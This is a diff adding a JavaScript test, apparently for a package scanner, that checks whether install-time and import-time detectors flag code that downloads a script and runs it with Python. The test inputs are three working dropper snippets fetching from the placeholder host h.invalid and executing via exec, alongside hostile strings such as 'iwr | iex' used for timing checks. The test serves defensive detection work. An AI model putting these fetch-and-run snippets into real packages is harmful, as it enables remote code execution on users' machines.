@@ -198,6 +198,22 @@ test("what a script puts into a container, the container holds (D-3)", () => {
   assert.deepEqual(installScriptRisk("const c = new Map();\nc.set('e', process.env);\n" + send("'ok'"), true, false, "js"), []);
 });
 
+test("a download a callback is given, written to a file and run (D-2)", () => {
+  // the request client's body, https.get's chunks, a pipe into a file (python: test_droppers.CallbackTests)
+  const head = "const fs = require('fs');\nconst { exec } = require('child_process');\nconst p = '/tmp/x.py';\n";
+  for (const shape of [
+    "const request = require('request');\nrequest.get('https://h.invalid/x.py', (e, r, b) => { fs.writeFileSync(p, b); exec('python3 ' + p); });\n",
+    "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { let d = ''; res.on('data', (c) => { d += c; }); res.on('end', () => { fs.writeFileSync(p, d); exec('python3 ' + p); }); });\n",
+    "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { const f = fs.createWriteStream(p); res.pipe(f); f.on('finish', () => exec('python3 ' + p)); });\n",
+  ]) {
+    assert.deepEqual(installScriptRisk(head + shape, true, false, "js"), ["downloads a script and runs it with Python"], shape);
+    assert.deepEqual(importTimeRisk(head + shape, "js")[0], ["downloads a script and runs it with Python"], shape);
+  }
+  // a download kept, nothing run: no reason of the tree's (the text detector's is as before)
+  const kept = importTimeRisk(head + "require('https').get('https://h.invalid/x.py', (res) => { res.pipe(fs.createWriteStream(p)); });\n", "js")[0];
+  assert.ok(!kept.some((r) => r.includes("runs it with")), kept.join("; "));
+});
+
 test("linear time on hostile texts", () => {
   for (const text of ["powershell ".repeat(50_000), "powershell -e " + "A".repeat(400_000), "'".repeat(200_000) + "exec http",
     "dup2(".repeat(100_000), "$(whoami)".repeat(50_000), "iwr ".repeat(100_000) + "| iex"]) {
